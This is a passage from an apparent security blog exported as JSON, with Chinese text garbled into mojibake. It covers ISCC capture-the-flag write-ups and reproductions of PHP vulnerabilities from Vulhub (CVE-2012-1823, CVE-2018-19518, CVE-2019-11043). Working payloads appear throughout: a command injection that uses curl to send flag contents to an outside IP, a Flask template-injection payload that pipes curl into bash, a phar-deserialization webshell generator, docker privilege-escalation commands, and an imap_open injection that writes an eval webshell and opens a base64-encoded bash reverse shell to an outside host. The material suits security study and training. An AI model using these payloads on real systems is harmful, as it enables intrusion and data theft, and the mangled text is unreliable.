if &#x27;admin&#x27; in r.text: flag=flag+s[s.index(i)-1] print(s[s.index(i)-1]) break if flag==f: breakprint(flag)# bfe42ac26e273ef3a859a651e0a02df0 ä¸çŸ¥é“ä¸ºå•¥æœ€åä¸€ä¸ª0è·‘äº†å¥½å‡ æ¬¡æ‰å‡ºæ¥ï¼Œä¸€ç›´å‡‘ä¸å¤Ÿ32ä½,è§£MD5å¾—åˆ° 1flag&#123;iloveishuai&#125; é˜¿å¸…çš„çˆ±æƒ…è®¿é—®å¾—åˆ°æºç ï¼š 1234567891011121314151617181920 &lt;?phpif(!isset($_GET[&quot;ip&quot;]))&#123; show_source(__file__);&#125; else&#123; $ip=$_GET[&quot;ip&quot;]; $pattern=&quot;/[;|&amp;].*[a-zA-Z]+/&quot;; if(preg_match($pattern,$ip)!=0)&#123; die(&#x27;bad domain&#x27;); &#125; try &#123; $result = shell_exec(&#x27;ping -c 4 &#x27; . $ip); &#125; catch(Exception $e) &#123; $result = $e-&gt;getMessage(); echo $result; &#125; $result = str_replace(&quot;\\n&quot;, &quot;&lt;br&gt;&quot;, $result); echo $result;&#125; ç›´æ¥æ„é€ payload: 1?ip=`curl 47.97.210.141:9000/?$(tail -n 2 flag.php)` miscISCCç­¾åˆ°ç›´æ¥æ”¹ä¸‹é«˜åº¦å°±èƒ½çœ‹åˆ° 1ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125; æäº¤å‘ç°ä¸å¯¹ï¼ŒçŒœæµ‹æ˜¯æŸç§ç¼–ç ï¼Œæœ€ç»ˆå‘ç°æ˜¯å‡¯æ’’å¯†ç å˜ç§,çœ‹ä¸‹è¿™ä¸ªè„šæœ¬å§ï¼Œå»æ‰æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œå‘ç°æœ‰è§„å¾‹ 123456789s1=&#x27;D3tivtm_zv_Tq5I_Dygef&#x27;s2=&#x27;W3lcome_to_Mi5C_Wryyy&#x27;for i,j in zip(s1,s2): if i not in &quot;0123456789_&quot;: if ord(i)-ord(j)&lt;0: print(i+&#x27; &#x27;+j+&#x27; &#x27;+str(26-ord(j)+ord(i))) else: print(i+&#x27; &#x27;+j+&#x27; &#x27;+str(ord(i)-ord(j)))# 7867å¾ªç¯ æœ€ç»ˆflagï¼Œå‰é¢çš„å¾ˆåƒwelcome toï¼Œå®åœ¨ä¸è¡ŒçŒœä¹Ÿè¡Œ 1ISCC&#123;W3lcome_to_Mi5C_Wryyy&#125; å¯»æ‰¾å°æ˜-1æ ¹æ®æœ€ä½ä½çš„èƒŒå½±.pngç«‹é©¬æƒ³åˆ°äº†lsbéšå†™ç›¸å…³çš„ï¼ŒStegSloveæ‰“å¼€ï¼Œåˆ‡æ¢ä¸åŒé€šé“ï¼Œå‘ç°ä¸€å¼ äºŒç»´ç  æ‰«å‡ºæ¥ä¸€ä¸ªé“¾æ¥ï¼Œæ‰“å¼€å‘ç°æ˜¯ 1[257,1,258,2,259,3,260,4,261,5,262,7,263,8,259,277,438,300,455,319,25,300,456,400,66,366,78,300,421,259,452,23] è¿™æ˜¯å•¥å‘¢ï¼Ÿ æœ€ç»ˆflag: 1flag&#123;ISCC*funny&#125; ISCCæˆç»©æŸ¥è¯¢-1StegSloveæ‰“å¼€ï¼Œå‘ç°è—ç€ æ²¿ç€è·¯å¾„èµ°å¾—åˆ° 1TRLNCHHAFCIEEIEEPR æ …æ å¯†ç è§£å¯†å¾—åˆ°flag 1flag&#123;THERAILFENCECIPHER&#125; ç¥ç§˜ç»„ç»‡çš„é‚®ä»¶-1StegSloveæ‰“å¼€ï¼Œå‘ç°æœ‰ 123é›„æœºå¯Œé­é›„ç½¡å­¤æ· å‹‡ç«‹é›„è‹±è´µçŒ›çŒ›å‹‡ å‘ç°æ¯ä¸ªæ±‰å­—å¯¹åº”36å¤©ç½¡72åœ°ç…ï¼Œè¯•äº†è¯•å‘ç°éƒ½æ˜¯å¤©ç½¡,æ¢æˆå¯¹åº”çš„é¡ºåº 1234567é›„æœºå¯Œé­ å¤©ï¼š6 3 11 1é›„ç½¡å­¤æ· å¤©ï¼š6 2 13 16å‹‡ç«‹é›„è‹± å¤©ï¼š5 15 6 9è´µçŒ›çŒ›å‹‡ å¤©ï¼š10 7 7 5 å‘ç°æœ€å¤§æ•°16ï¼Œæœ€å°æ•°ä¸º1ï¼Œæƒ³åˆ°16è¿›åˆ¶ï¼Œæ‰€æœ‰æ•°å‡1ï¼Œè½¬æ¢æˆ16è¿›åˆ¶ï¼Œè½¬æ¢æˆUTF-16 123456789é›„æœºå¯Œé­ å¤©ï¼š6 3 11 1 52a0é›„ç½¡å­¤æ· å¤©ï¼š6 2 13 16 51cfå‹‡ç«‹é›„è‹± å¤©ï¼š5 15 6 9 4e58è´µçŒ›çŒ›å‹‡ å¤©ï¼š10 7 7 5 9664\\u52a0\\u51cf\\u4e58\\u9664 UTF-16è½¬æ¢åœ°å€ï¼šhttp://www.msxindl.com/tools/unicode16.asp 1flag&#123;åŠ å‡ä¹˜é™¤&#125; è€³å¬ä¸ºå®æŸ¥çœ‹å±æ€§å‘ç°å‰¯æ ‡é¢˜æ˜¯flag,çŒœæµ‹MP3Stegoéšå†™ï¼Œå¯†ç è¯•è¯•flagï¼Œå¾—åˆ°ï¼š 123flag is hereï¼https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1L3cq1CRVhvv6mq8qogq-sAdHc0aQ&#x3D;&#x3D; base64è§£å¯†å¾—åˆ°æå–ç ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æ¯”åŸæ¥çš„å¤§ï¼Œbinwalkåˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ° flag-RD.wavå’Œctf-produce.py ctf-produce.py: 1234567891011121314151617181920212223242526272829303132333435import waveimport numpy as npimport os# è¯»å–éŸ³é¢‘ä¿¡å·f = wave.open(os.path.abspath(&#x27;./flag.wav&#x27;), &#x27;rb&#x27;) # äºŒè¿›åˆ¶åªè¯»æ¨¡å¼ï¼Œæ‰“å¼€éŸ³é¢‘æ–‡ä»¶params = f.getparams() # è¿”å›éŸ³é¢‘å‚æ•°ï¼Œå…ƒç»„ï¼šå£°é“æ•°ï¼Œé‡åŒ–ä½æ•°(byteå•ä½)ï¼Œé‡‡æ ·é¢‘ç‡ï¼Œé‡‡æ ·ç‚¹æ•°ï¼Œå‹ç¼©ç±»å‹ï¼Œå‹ç¼©ç±»å‹çš„æè¿°nchannels, sampwidth, framerate, nframes=params[:4] # èµ‹å€¼å£°é“æ•°ï¼Œé‡åŒ–ä½æ•°ï¼Œé‡‡æ ·é¢‘ç‡ï¼Œé‡‡æ ·ç‚¹æ•°str = f.readframes(nframes) # è¯»å–é‡‡æ ·ç‚¹æ•°æ®ï¼Œå­—ç¬¦ä¸²ç±»å‹wave_data = np.fromstring(str, dtype=np.short) # å­—ç¬¦ä¸²è½¬æ¢ä¸ºshortç±»å‹time = np.arange(0, nframes) * (1.0 / framerate) # é€šè¿‡é‡‡æ ·ç‚¹æ•°å’Œå–æ ·é¢‘ç‡è®¡ç®—å‡ºæ¯ä¸ªå–æ ·çš„æ—¶é—´# è¯­éŸ³ä¿¡å·åˆ†å¸§å¤„ç†wlen = 100 # å¸§é•¿inc = 50 # å¸§ç§»signal_length = len(wave_data) # ä¿¡å·æ€»é•¿åº¦if signal_length &lt;= wlen: # è‹¥ä¿¡å·é•¿åº¦å°äºä¸€ä¸ªå¸§çš„é•¿åº¦ï¼Œåˆ™å¸§æ•° nf å®šä¹‰ä¸º1ï¼Œå¦åˆ™ï¼Œè®¡ç®—å¸§çš„æ€»é•¿åº¦ nf = 1else: nf = int(np.ceil((1.0*signal_length-wlen+inc)/inc))pad_length = int((nf-1)*inc+wlen) # æ‰€æœ‰å¸§åŠ èµ·æ¥æ€»çš„é“ºå¹³åçš„é•¿åº¦zeros = np.zeros((pad_length-signal_length), dtype=int) # ä¸å¤Ÿçš„é•¿åº¦ä½¿ç”¨0å¡«è¡¥pad_signal = np.concatenate((wave_data,zeros)) # å¡«è¡¥åçš„ä¿¡å·è®°ä¸ºpad_signalindices = np.tile(np.arange(0,wlen),(nf,1))+np.tile(np.arange(0,nf*inc,inc), (wlen,1)).T # ç›¸å½“äºå¯¹æ‰€æœ‰å¸§çš„æ—¶é—´ç‚¹è¿›è¡ŒæŠ½å–ï¼Œå¾—åˆ°nf*wlené•¿åº¦çš„çŸ©é˜µindices = np.array(indices, dtype=np.int32) # å°†indicesè½¬åŒ–ä¸ºçŸ©é˜µindices = np.random.permutation(indices)frames = pad_signal[indices] # å¾—åˆ°å¸§ä¿¡å·frames = frames.flatten()w = wave.open(os.path.abspath(&#x27;./flag-RD.wav&#x27;), &quot;wb&quot;) # æ‰“å¼€WAVæ–‡æ¡£# é…ç½®å£°é“æ•°ã€é‡åŒ–ä½æ•°å’Œå–æ ·é¢‘ç‡w.setnchannels(nchannels)w.setsampwidth(sampwidth)w.setframerate(framerate*2) # é‡‡æ ·é¢‘ç‡è‡³å°‘æ˜¯ä¿¡å·é¢‘ç‡æœ€é«˜é¢‘ç‡çš„ä¸¤å€ä»¥ä¸Šæ‰èƒ½é‡æ–°æ¢å¤ä¸ºåŸæ¥çš„æ¨¡æ‹Ÿä¿¡å·w.writeframes(frames.tostring()) # å°†wav_dataè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®å†™å…¥æ–‡ä»¶w.close()f.close() å¾ˆæ˜æ˜¾ï¼Œéœ€è¦æˆ‘ä»¬é€†æ¨flag.waväº† åƒå±‚å¥—è·¯ä¸€å¼ gifå›¾ç‰‡ï¼Œstegsloveåˆ†ç¦»å‡º8å¼ å›¾ç‰‡ï¼Œpsæ‹¼ä¸€ä¸‹ 1sr5#TKh~ck3^ æäº¤flagå‘ç°ä¸å¯¹ æ“‚å°é¢˜webEasy Injectionflask sstiï¼Œç›´æ¥Pç¥çš„payloadåå¼¹shell: 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;curl ip|bash&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; rootæƒé™å°±å¾ˆå¥‡æ€ª å¤§é»‘é˜”æ‰«ç›®å½•ï¼Œå‘ç°æœ‰æºç www.zip upload.php: 1234567891011121314151617181920212223&lt;?php$tmp_file_location=&#x27;/var/www/html/&#x27;;if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists($tmp_file_location.&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $tmp_file_location.&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; .$tmp_file_location. &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;else &#123; echo &quot;Invalid file,you can only upload gif&quot;; &#125;?&gt; show.php: 12345678910&lt;?php$filename=$_GET[&#x27;filename&#x27;];class AnyClass&#123; var $output = &#x27;echo &quot;ok&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); å¾ˆæ˜æ˜¾pharååºåˆ—åŒ–ï¼Œç”±äºç‰ˆæœ¬æ˜¯php5.6ï¼Œå¯ä»¥ç”¨assertï¼Œæ‰€ä»¥æ„é€  12345678910111213&lt;?phpclass AnyClass&#123; var $output = &#x27;assert($_POST[1]);&#x27;;&#125;$phar = new Phar(&quot;shell.phar&quot;); //åç¼€åå¿…é¡»ä¸º phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new AnyClass;$phar-&gt;setMetadata($object); //å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt; è¿›å»ä¹‹åå‘ç°flagåœ¨/root/flag.txt,åå¼¹shell,dockerææƒ 123docker pull alpinedocker docker run -id -v /:/tmp alpinedocker exec 68335e7b38e0 cat /tmp/root/flag.txt miscæ˜¯æˆ‘DIOå“’foremoståˆ†ç¦»å‡ºä¸€å¼ äºŒç»´ç ï¼Œä¸çŸ¥é“binwalkä¸ºå•¥ä¸è¡Œï¼Œæ‰«å‡ºæ¥æ˜¯: 1Useful_Massage_1(SVNDQyU3QmZsQGdfaXN StegSolveåˆ†ç¦»å‡ºç¬¬äºŒéƒ¨åˆ† 1Useful_M assage_2(fa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA&#x3D;&#x3D;) æ‹¼æ¥åˆ°ä¸€å—ï¼Œbase64è§£å¯†å¹¶urlè§£ç å¾—åˆ°flag 1ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125; Easy_Minecraftä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬çš„mcï¼Œæ·»åŠ æœåŠ¡å™¨å‘ç°ï¼š 1key2:Decode(n*Base64_Decode(VlRKR2MyUkhWbXRZTVNzNVRWVkp0VFl3YVdoUmRFNXBNelozYkVKWVJWbE9Za1pKUVV4b00wdDJRU1V6UkElM0QlM0Q%3D)) base64è§£å¯†ä¸€æ¬¡ä¸ºï¼š 1VTJGc2RHVmtYMSs5TVVJtTYwaWhRdE5pMzZ3bEJYRVlOYkZJQUxoM0t2QSUzRA&#x3D;&#x3D; å†è§£å¯†ä¸€æ¬¡ 1U2FsdGVkX1+9MUIÂµ60ihQtNi36wlBXEYNbFIALh3KvA&#x3D; ç›´æ¥åŠ å…¥æœåŠ¡å™¨ä¼šæç¤ºï¼š 1ZmxhZ3tJNV90aDFzX2ZsQGc&#x2F;fQ&#x3D;&#x3D; base64è§£å¯†ä¹‹åæ˜¯ï¼š 1flag&#123;I5_th1s_fl@g?&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ISCC","slug":"ISCC","permalink":"http://www.m00nback.xyz/tags/ISCC/"}]},{"title":"Vulhubä¹‹php","slug":"Vulhubä¹‹php","date":"2020-05-05T07:34:06.000Z","updated":"2020-05-06T13:45:28.060Z","comments":true,"path":"2020/05/05/Vulhubä¹‹php/","link":"","permalink":"http://www.m00nback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦å¤ç°äº†Vulhubä¸Šçš„phpéƒ¨åˆ†æ¼æ´ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦å¤ç°äº†Vulhubä¸Šçš„phpéƒ¨åˆ†æ¼æ´ï¼ CVE-2012-1823æ¼æ´ç®€ä»‹è¯¥æ¼æ´å¯å¯¼è‡´ä»£ç æ‰§è¡Œã€‚ WEB ä¸­ï¼Œ Web Server ä¸€èˆ¬æŒ‡Apacheã€Nginxã€IISã€Lighttpdã€Tomcatç­‰æœåŠ¡å™¨ Web Application ä¸€èˆ¬æŒ‡PHPã€Javaã€Asp.netç­‰åº”ç”¨ç¨‹åº cgiï¼š Web Server ä¸ Web Application ä¹‹é—´æ•°æ®äº¤æ¢çš„ä¸€ç§åè®® FastCGIï¼šåŒ CGIï¼Œæ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½†æ¯” CGI åœ¨æ•ˆç‡ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚åŒæ ·ï¼ŒSCGI åè®®ä¸ FastCGI ç±»ä¼¼ PHP-CGIï¼šæ˜¯ PHP ï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ CGI åè®®çš„æ¥å£ç¨‹åº PHP-FPMï¼šæ˜¯ PHPï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ FastCGI åè®®çš„æ¥å£ç¨‹åºï¼Œé¢å¤–è¿˜æä¾›äº†ç›¸å¯¹æ™ºèƒ½ä¸€äº›ä»»åŠ¡ç®¡ç† åœ¨æ•´ä¸ªç½‘ç«™æ¶æ„ä¸­ï¼ŒWeb Serverï¼ˆå¦‚Apacheï¼‰åªæ˜¯å†…å®¹çš„åˆ†å‘è€…ã€‚å¦‚æœå®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯ index.htmlï¼Œé‚£ä¹ˆWeb Serverä¼šå»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œä¸‹å›¾åˆ†å‘çš„æ˜¯é™æ€æ•°æ®ã€‚ å¦‚æœè¯·æ±‚çš„æ˜¯ index.phpï¼Œæ ¹æ®é…ç½®æ–‡ä»¶ï¼ŒWeb ServerçŸ¥é“è¿™ä¸ªä¸æ˜¯é™æ€æ–‡ä»¶ï¼Œéœ€è¦å»æ‰¾ PHP è§£æå™¨æ¥å¤„ç†ï¼Œé‚£ä¹ˆä»–ä¼šæŠŠè¿™ä¸ªè¯·æ±‚ç®€å•å¤„ç†ï¼Œç„¶åäº¤ç»™PHPè§£æå™¨ã€‚ å½“Web Serveræ”¶åˆ° index.php è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šCGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€PHP Webè®¿é—®æµç¨‹ã€‚ æ›´è¯¦ç»†çš„å†…å®¹å‚è€ƒï¼š https://www.cnblogs.com/zzx-hjl/p/10583849.html https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html æœ¬æ¼æ´åªå‡ºç°åœ¨ä»¥cgiæ¨¡å¼è¿è¡Œçš„phpä¸­ï¼Œå½±å“ç‰ˆæœ¬ php &lt; 5.3.12 or php &lt; 5.4.2ã€‚ è¿™ä¸ªæ¼æ´ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç”¨æˆ·è¯·æ±‚çš„querystringè¢«ä½œä¸ºäº†php-cgiçš„å‚æ•°ï¼Œæœ€ç»ˆå¯¼è‡´äº†ä¸€ç³»åˆ—ç»“æœã€‚ æ¼æ´å¤ç°ç›´æ¥è®¿é—®ä¸€ä¸ªphpæ–‡ä»¶åŠ ä¸Š-så°±èƒ½çœ‹åˆ°æºç  é™¤äº†-sè¿˜æœ‰ä»¥ä¸‹å‚æ•°å¯ç”¨ï¼š -c æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½® -n ä¸è¦åŠ è½½php.iniæ–‡ä»¶ -d æŒ‡å®šé…ç½®é¡¹ -b å¯åŠ¨fastcgiè¿›ç¨‹ -T æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶ -hå’Œ-? æ˜¾ç¤ºå¸®åŠ© æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„è¯·æ±‚æ¥æ‰§è¡Œä»£ç ï¼š 1234POST:/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input&lt;?php phpinfo(); è¿™ä¸ªæ¼æ´è¢«çˆ†å‡ºæ¥ä»¥åï¼ŒPHPå®˜æ–¹å¯¹å…¶è¿›è¡Œäº†ä¿®è¡¥ï¼Œå‘å¸ƒäº†æ–°ç‰ˆæœ¬5.4.2åŠ5.3.12ï¼Œä½†è¿™ä¸ªä¿®å¤æ˜¯ä¸å®Œå…¨çš„ï¼Œå¯ä»¥è¢«ç»•è¿‡ï¼Œè¿›è€Œè¡ç”Ÿå‡ºCVE-2012-2311æ¼æ´ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç©ºæ ¼+-ç»•è¿‡ã€‚ CVE-2018-19518æ¼æ´ç®€ä»‹è¯¥æ¼æ´å¯å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ php imapæ‰©å±•ç”¨äºåœ¨PHPä¸­æ‰§è¡Œé‚®ä»¶æ”¶å‘æ“ä½œã€‚å…¶imap_openå‡½æ•°ä¼šè°ƒç”¨rshæ¥è¿æ¥è¿œç¨‹shellï¼Œè€Œdebian/ubuntuä¸­é»˜è®¤ä½¿ç”¨sshæ¥ä»£æ›¿rshçš„åŠŸèƒ½ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨debianç³»åˆ—ç³»ç»Ÿä¸­ï¼Œæ‰§è¡Œrshå‘½ä»¤å®é™…æ‰§è¡Œçš„æ˜¯sshå‘½ä»¤ï¼‰ã€‚ å› ä¸ºsshå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡è®¾ç½®-oProxyCommand=æ¥è°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥æ³¨å…¥è¿™ä¸ªå‚æ•°ï¼Œæœ€ç»ˆå°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ æ¼æ´å¤ç°æ¼æ´ç¯å¢ƒå…³é”®ä»£ç ï¼š 12345&lt;?phpif(!empty($_POST)) &#123; $imap = @imap_open(&#x27;&#123;&#x27;.$_POST[&#x27;hostname&#x27;].&#x27;:993/imap/ssl&#125;INBOX&#x27;, $_POST[&#x27;username&#x27;], $_POST[&#x27;password&#x27;]);&#125;?&gt; è¯¥å‘½ä»¤æ‰§è¡Œæ˜¯æ— å›æ˜¾çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ç€å†™é©¬ï¼š 12POST:hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2BJz5tb29uYmFjay5waHA%3D|base64%09-d|sh&#125;&amp;username=111&amp;password=222 å…¶ä¸­base64ç¼–ç æ˜¯ 1echo &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&gt;moonback.php æˆ–è€…ä¸ç”¨è¿™æ ·éº»çƒ¦ï¼Œç›´æ¥åŠ ä¸Š;æ‰§è¡Œå‘½ä»¤ 12POST:hostname=x+-oProxyCommand%3d;ls&gt;a&#125;&amp;username=111&amp;password=222 åå¼¹shell: 12POST:hostname=x+-oProxyCommand%3decho%09YmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzkwMDAgMD4mMQ%3D%3D|base64%09-d|bash&#125;&amp;username=111&amp;password=222 CVE-2019-11043æ¼æ´ç®€ä»‹åœ¨é•¿äº­ç§‘æŠ€ä¸¾åŠçš„ Real World CTF ä¸­ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶å‘˜ Andrew Danau åœ¨è§£å†³ä¸€é“ CTF é¢˜ç›®æ—¶å‘ç°ï¼Œå‘ç›®æ ‡æœåŠ¡å™¨ URL å‘é€ %0a ç¬¦å·æ—¶ï¼ŒæœåŠ¡è¿”å›å¼‚å¸¸ï¼Œç–‘ä¼¼å­˜åœ¨æ¼æ´ã€‚ åœ¨ä½¿ç”¨ä¸€äº›æœ‰é”™è¯¯çš„Nginxé…ç½®çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ¶æ„æ„é€ çš„æ•°æ®åŒ…ï¼Œå³å¯è®©PHP-FPMæ‰§è¡Œä»»æ„ä»£ç ã€‚ åˆ©ç”¨æ¡ä»¶å’Œå½±å“èŒƒå›´ï¼š åˆ©ç”¨æ¡ä»¶ä»¥åŠæ¼æ´å½±å“èŒƒå›´ã€‚ 1ã€Nginx + php_fpmï¼Œä¸”é…ç½®location ~ [^/]\\.php(/|$)ä¼šå°†è¯·æ±‚è½¬å‘åˆ°php-fpmã€‚2ã€Nginxé…ç½®fastcgi_split_path_infoå¹¶ä¸”ä»¥^å¼€å§‹ä»¥$ï¼Œåªæœ‰åœ¨è¿™ç§æ¡ä»¶ä¸‹æ‰å¯ä»¥é€šè¿‡æ¢è¡Œç¬¦æ¥æ‰“æ–­æ­£åˆ™è¡¨è¾¾å¼åˆ¤æ–­ã€‚ ps: åˆ™å…è®¸index.php/321 -&gt; index.php 1fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$; 3ã€fastcgi_paramä¸­PATH_INFOä¼šè¢«å®šä¹‰é€šè¿‡fastcgi_param PATH_INFO $fastcgi_path_info;ï¼Œå½“ç„¶è¿™ä¸ªå˜é‡ä¼šåœ¨fastcgi_paramsé»˜è®¤å®šä¹‰ã€‚4ã€åœ¨nginxå±‚é¢æ²¡æœ‰å®šä¹‰å¯¹æ–‡ä»¶çš„æ£€æŸ¥æ¯”å¦‚try_files $uri =404ï¼Œå¦‚æœnginxå±‚é¢åšäº†æ–‡ä»¶æ£€æŸ¥ï¼Œåˆ™è¯·æ±‚ä¸ä¼šè¢«è½¬å‘ç»™php-fmpã€‚ nginxé…ç½®ç±»ä¼¼äºï¼š 1234567891011121314151617server &#123; listen 80; server_name _; root /usr/share/nginx/html; location ~ [^/]\\.php(/|$) &#123; # try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass 172.16.88.3:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_hide_header X-Powered-By; &#125;&#125; è¿™ä¸ªæ¼æ´åœ¨å®é™…ç ”ç©¶è¿‡ç¨‹ä¸­å¯¹çœŸå®ä¸–ç•Œå±å®³æœ‰é™ï¼Œå…¶ä¸»è¦åŸå› éƒ½åœ¨äºå¤§éƒ¨åˆ†çš„nginxé…ç½®ä¸­éƒ½æºå¸¦äº†å¯¹æ–‡ä»¶çš„æ£€æŸ¥ï¼Œä¸”é»˜è®¤çš„nginxé…ç½®ä¸åŒ…å«è¿™ä¸ªé—®é¢˜ æ¼æ´å¤ç°exp githubåœ°å€ï¼šhttps://github.com/neex/phuip-fpizdam ubuntuå®‰è£…goç¯å¢ƒï¼Œç›´æ¥ç”¨aptå®‰è£…çš„æ˜¯1.6ç‰ˆæœ¬ï¼Œè¯¥è„šæœ¬è¦æ±‚1.13åŠä»¥ä¸Š 123sudo add-apt-repository ppa:longsleep/golang-backportssudo apt-get updatesudo apt-get install golang-go é»˜è®¤é¡¹ç›®æ–‡ä»¶å¤¹æ˜¯~/goï¼Œæ¥ç€å°± 1go get github.com/neex/phuip-fpizdam åœ¨~/go/binä¸‹é¢å°±èƒ½çœ‹åˆ°ç¼–è¯‘æˆåŠŸçš„äºŒè¿›åˆ¶æ–‡ä»¶äº†ï¼Œè·‘exp: ç„¶åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº† åˆ©ç”¨phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶æ¼æ´ç®€ä»‹è¯¥æ¼æ´éœ€è¦æœ‰åŒ…å«ç‚¹ï¼Œå¹¶ä¸”æœ‰phpinfoé¡µé¢ï¼Œç„¶åå°±èƒ½getshellï¼Œè¯¥æ¼æ´ä¸phpç‰ˆæœ¬æ— å…³ åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œæ–‡ä»¶åå¯ä»¥åœ¨$_FILESå˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚ åŒæ—¶ï¼Œå› 